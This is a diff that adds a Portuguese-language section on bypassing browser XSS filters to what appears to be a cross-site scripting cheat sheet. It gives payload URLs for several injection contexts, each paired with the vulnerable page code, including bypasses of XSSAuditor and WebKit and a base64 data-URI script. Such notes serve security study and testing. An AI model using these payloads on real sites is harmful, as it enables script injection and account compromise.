@@ -299,3 +299,59 @@ Uma forma de executar o código sem usar parenteses:
 
 # Bypassing Browser Filters
 
+**Dentro da Tag HTML**
+
+```
+http://victim.site/inject?x=<svg/onload=alert(1)>       // Block
+http://victim.site/inject?x=<svg/onload=alert(1)        // Bypass XSSAuditor
+
+// Cenário
+<div>
+	Hello *Injection*
+</div>
+```
+
+**Dentro do atributo da Tag HTML**
+
+```
+http://victim.site/inject?x=giuseppe"><svg/onload=alert(1)>       // Block
+http://victim.site/inject?x=giuseppe"><a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">clickhere<!--        // Bypass WebKit
+
+// Cenário
+Change your username
+<input value="Injection"/>
+```
+
+**Dentro da Tag script**
+
+```
+http://victim.site/inject?name=giuseppe";alert(1);//
+
+// Cenário
+<script>
+	var name = "Injection";
+</div>
+```
+
+**Dentro de atributo Event**
+
+```
+http://victim.site/inject?roomID=alert(1)
+
+// Cenário
+<button onclick="reserve(roomID);">
+Reserve your sit!
+</button>
+```
+
+**DOM Basec**
+
+```
+http://victim.site/inject?next=javascript:alert(1)
+
+// Cenário
+<script>
+...
+var next = location.search.replace("?next=", "");
+domEl.innerHTML = "<a href='"+next+"'>next page</a>";
+```
